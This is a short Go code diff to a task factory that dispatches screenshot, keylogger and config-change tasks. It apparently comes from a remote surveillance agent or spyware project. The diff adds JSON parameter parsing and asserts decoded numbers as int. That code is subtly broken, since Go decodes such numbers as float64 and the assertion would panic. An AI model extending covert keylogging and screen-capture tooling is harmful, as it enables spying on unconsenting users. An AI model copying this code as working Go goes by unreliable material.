@@ -36,13 +36,17 @@ var lgr = logger.GetLogger()
 func NewAppFactory(appData AppData) (App, error) {
 	var app App = nil
 	var err error = nil
+	appParams := map[string]any{}
+	if err = json.Unmarshal(appData.Params, &appParams); err != nil {
+		return nil, err
+	}
 
 	switch appData.Type {
 	case ChangeConfigTask:
 		// TODO: change config on demand
 		break
 	case ScreenShotTask:
-		app, err = newApp[ScreenshotApp](appData.Params)
+		app = NewScreenshotApp(appParams["Interval"].(int), appParams["Quality"].(int))
 		break
 	case KeyLoggerTask:
 		app, err = newApp[KeyLoggerApp](appData.Params)
